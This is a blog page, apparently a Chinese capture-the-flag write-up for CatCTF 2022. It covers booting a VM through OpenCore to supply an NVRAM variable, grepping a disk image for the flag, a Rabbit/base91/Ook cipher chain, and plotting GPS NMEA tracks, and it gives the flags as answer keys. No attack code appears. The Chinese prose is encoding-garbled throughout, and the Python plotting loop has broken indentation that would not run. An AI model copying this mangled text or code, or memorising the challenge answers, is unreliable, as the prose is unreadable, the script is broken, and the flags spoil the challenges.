è¿›å…¥æ¸¸æˆåï¼Œè¿™é‡Œæœ‰ä¸ªå°è„‘æ´ï¼Œä¸€èˆ¬çš„æ¸¸æˆéƒ½ä¼šæœ‰ã€Œé€€å‡ºã€æ¨¡å—ï¼Œä¸€èˆ¬ä¸ºã€Œqã€ï¼Œä½†è¿™é‡Œç”¨çš„æ˜¯ã€Œ]ã€ï¼Œé€€å‡ºåå³å¯å‘ç°è¯»å–æ–‡ä»¶å¤±è´¥äº†ã€‚

![](Nepnep-CatCTF2022/16727258094705_G4mqRjXCyX.jpg)

è¯»å–çš„æ˜¯nvramä¸­çš„ä¸€ä¸ªç‰¹å®šå˜é‡ï¼Œå¦‚æ— æ³•æ£€æµ‹åˆ°è¿™ä¸ªå˜é‡çš„è¯ï¼Œå³ä½¿è¿›äº†ç³»ç»Ÿç™»å½•ç•Œé¢ä¹Ÿæ— æµäºäº‹ã€‚

é€šè¿‡opencoreåšä¸€ä¸ªå¼•å¯¼é©±åŠ¨ï¼Œåœ¨nvramä¸­å†™å…¥æŠ¥é”™ä¸­çš„ç‰¹å®šå˜é‡åå’Œå˜é‡å€¼ï¼Œå°†è¯¥å¼•å¯¼æŒ‚è½½åˆ°è™šæ‹Ÿæœºä¸­ï¼Œæˆ‘è¿™ç›´æ¥ç”¨çš„Uç›˜åˆ›äº†ä¸ªESPåˆ†åŒºï¼ŒæŠŠEFIä¸¢è¿›å»äº†ã€‚

![](Nepnep-CatCTF2022/16727259978933_9DGf9SkdmT.jpg)

![](Nepnep-CatCTF2022/16727273192363_Hp2xaNCv6E.jpg)

å¦‚æœUç›˜æ˜¯USB3.1çš„è®°å¾—æ”¹ä¸‹å…¼å®¹æ€§

![](Nepnep-CatCTF2022/16727273895670_7O4huPDria.jpg)

å¯åŠ¨åˆ°å›ºä»¶åï¼Œé€‰æ‹©opencoreå¯åŠ¨ï¼Œè¿™æ ·EFIå¼•å¯¼å°±æ˜¯èµ°çš„opencoreï¼Œæ¨¡æ‹Ÿå‡ºçš„nvramä¹Ÿå°±èƒ½è·å–åˆ°ã€‚

![](Nepnep-CatCTF2022/16727274136847_ziBLJihTah.jpg)

![](Nepnep-CatCTF2022/16727274275381_0KMCb0M7e3.jpg)

æœ€ç»ˆè¿›å…¥å¯åŠ¨ç•Œé¢å³å¯è·å–flagã€‚

![](Nepnep-CatCTF2022/16727274418685_OZSTGT6olj.jpg)

#### è§£é¢˜æ€è·¯3ï¼ˆéé¢„æœŸï¼‰

1.  strings cat\_jump\_clean.vmdk | grep CatCTF{
2.  010ç¼–è¾‘æœç´¢
3.  å–è¯å¤§å¸ˆæå–åŸå§‹æ•°æ®
4.  è®°äº‹æœ¬æ‰“å¼€
5.  .....

æ€»ä¹‹å°±æ˜¯ç£ç›˜æ•°æ®æ²¡æ¸…å¹²å‡€ï¼Œè¢«ä¸€æŠŠæ¢­äº†ã€‚

### CatCat

rabbitè§£å¯†ï¼Œå¯†é’¥åœ¨å›¾ç‰‡ä¸­ä½¿ç”¨stringsæœç´¢passwordå³å¯æ‰¾åˆ°

![](Nepnep-CatCTF2022/1672763715868_Ixujs6YJde.png)

å°†è§£å¯†ç»“æœé‡‡ç”¨base91è§£å¯†ï¼Œé‡‡ç”¨åœ¨çº¿ç½‘ç«™([https://ctf.bugku.com/tool/brainfuck](https://ctf.bugku.com/tool/brainfuck "https://ctf.bugku.com/tool/brainfuck"))è½¬æ¢Ookï¼Œæœ€åè§£å¯†å³å¯

CatCTF{Th1s\_V3ry\_cute\_catcat!!!}

### CatchCat

é¢˜ç›®é™„ä»¶ç»™å‡ºçš„æ˜¯GPSçš„NMEAæ ¼å¼è½¨è¿¹æ•°æ®

![](Nepnep-CatCTF2022/image_vCasnHhDRI.png)

æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯NMEAè½¬KMLå¯è§†åŒ–è¿˜åŸGPSè½¨è¿¹

[https://www.h-schmidt.net/NMEA/](https://www.h-schmidt.net/NMEA/ "https://www.h-schmidt.net/NMEA/")

![](Nepnep-CatCTF2022/image_iXZu0a3L1-.png)

![](Nepnep-CatCTF2022/image_XEtj08zH_I.png)

NMEAè½¬KMLä¹‹åå†å¯è§†åŒ–å°±å¯ä»¥äº†

[https://mygeodata.cloud/converter/](https://mygeodata.cloud/converter/ "https://mygeodata.cloud/converter/")

![](Nepnep-CatCTF2022/image_uyL446C1JK.png)

![](Nepnep-CatCTF2022/image_JT4arjVZpH.png)

![](Nepnep-CatCTF2022/image_nJqvtBCn_5.png)

![](Nepnep-CatCTF2022/image_e3sSc1hTkc.png)

ä¸ºäº†æ–¹ä¾¿å¤§å®¶è¯†åˆ«ï¼Œè¿™é‡Œå¤§å¤§ç¼©çŸ­äº†flagçš„å†…å®¹ã€‚

CatCTF{GPS\_M1ao}

å¦å¤–ä¸€ç§æ–¹æ³•å°±æ˜¯å†™è„šæœ¬æå–æ•°æ®è¿˜åŸGPSè½¨è¿¹ï¼Œå¤§å®¶æ ¹æ®è‡ªå·±çš„å–œå¥½æ¥è§£å†³å°±å¥½å•¦ã€‚

```python
import matplotlib.pyplot as plt

data = open('CatchCat.txt', 'r').readlines()

x = []

y = []

for line in data:

  if line.strip():

  d1, d2 = float(line[17:30]), float(line[33:47])

  x.append(d1)

  y.append(d2)

plt.scatter(x,y)

plt.show()
```

![](Nepnep-CatCTF2022/image_MpKNvK4Z-P.png)

CatCTF{GPS\_M1ao}

### Nepnep ç¥ä½ æ–°å¹´å¿«ä¹å•¦ï¼&#xD;

[æ–°å¹´å¿«ä¹ï¼\_å“”å“©å“”å“©\_bilibili](https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from=333.999.0.0\&vd_source=fa625999cb95a3474b87f02e1e0f148f "æ–°å¹´å¿«ä¹ï¼_å“”å“©å“”å“©_bilibili")

[https://www.bilibili.com/video/BV1VM411y7am/?spm\_id\_from=333.999.0.0\&vd\_source=fa625999cb95a3474b87f02e1e0f148f](https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from=333.999.0.0\&vd_source=fa625999cb95a3474b87f02e1e0f148f "https://www.bilibili.com/video/BV1VM411y7am/?spm_id_from=333.999.0.0\&vd_source=fa625999cb95a3474b87f02e1e0f148f")

è§†é¢‘è¯„è®ºåŒºç½®é¡¶ï¼Œè§†é¢‘æœ€åä¸€å¸§ä¹Ÿæœ‰

H4ppy\_n3w\_y34r
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io">xia0ji233</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/">https://xia0ji233.github.io/2023/01/01/Nepnep-CatCTF2022/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href="https://xia0ji233.github.io" target="_blank">xia0ji233's blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/04/Go13/" title="Golangå…¥é—¨å­¦ä¹ ï¼ˆ13ï¼‰"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸Šä¸€ç¯‡</div><div class="prev_info">Golangå…¥é—¨å­¦ä¹ ï¼ˆ13ï¼‰</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/01/target/" title="å­¦ä¹ ç›®æ ‡"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">ä¸‹ä¸€ç¯‡</div><div class="next_info">å­¦ä¹ ç›®æ ‡</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><a href="/"> <div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div></a><div class="author-info__name">xia0ji233</div><div class="author-info__description">Nepnep team</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">274</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">173</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xia0ji233"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/xia0ji233" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xia0ji233@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">è€å½“ç›Šå£®ï¼Œå®ç§»ç™½é¦–ä¹‹å¿ƒï¼Ÿç©·ä¸”ç›Šåšï¼Œä¸å é’äº‘ä¹‹å¿—ã€‚</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>æœ€æ–°æ–‡ç« </span></div><div class="aside-list"><div class="aside-list-item"><div class="content"><a class="title" href="/2024/03/30/tencent-race-2020-pre/" title="è…¾è®¯æ¸¸æˆå®‰å…¨å¤§èµ›2020åˆèµ›é¢˜è§£">è…¾è®¯æ¸¸æˆå®‰å…¨å¤§èµ›2020åˆèµ›é¢˜è§£</a><time datetime="2024-03-29T17:00:00.000Z" title="å‘è¡¨äº 2024-03-30 01:00:00">2024-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/21/tencent-race-2022-final/" title="è…¾è®¯æ¸¸æˆå®‰å…¨å¤§èµ›2022å†³èµ›é¢˜è§£">è…¾è®¯æ¸¸æˆå®‰å…¨å¤§èµ›2022å†³èµ›é¢˜è§£</a><time datetime="2024-03-21T15:00:00.000Z" title="å‘è¡¨äº 2024-03-21 23:00:00">2024-03-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/19/tencent-race-2022-pre/" title="è…¾è®¯æ¸¸æˆå®‰å…¨å¤§èµ›2022åˆèµ›é¢˜è§£">è…¾è®¯æ¸¸æˆå®‰å…¨å¤§èµ›2022åˆèµ›é¢˜è§£</a><time datetime="2024-03-19T15:00:00.000Z" title="å‘è¡¨äº 2024-03-19 23:00:00">2024-03-19</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/03/13/CVE-2021-4145/" title="dirty cred(CVE-2021-4145)æ¼æ´å¤ç°">dirty cred(CVE-2021-4145)æ¼æ´å¤ç°</a><time datetime="2024-03-13T15:00:00.000Z" title="å‘è¡¨äº 2024-03-13 23:00:00">2024-03-13</time></div></div><div class="aside-list-item"><div class="content"><a class="title" href="/2024/03/04/LLVM5/" title="LLVMâ€”â€”äº¤å‰ç¼–è¯‘çš„é…ç½®">LLVMâ€”â€”äº¤å‰ç¼–è¯‘çš„é…ç½®</a><time datetime="2024-03-04T12:00:00.000Z" title="å‘è¡¨äº 2024-03-04 20:00:00">2024-03-04</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2024 By xia0ji233</div><div class="framework-info"><span>æ¡†æ¶ </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>ä¸»é¢˜ </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">welcome to my blog</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æµ…è‰²å’Œæ·±è‰²æ¨¡å¼è½¬æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>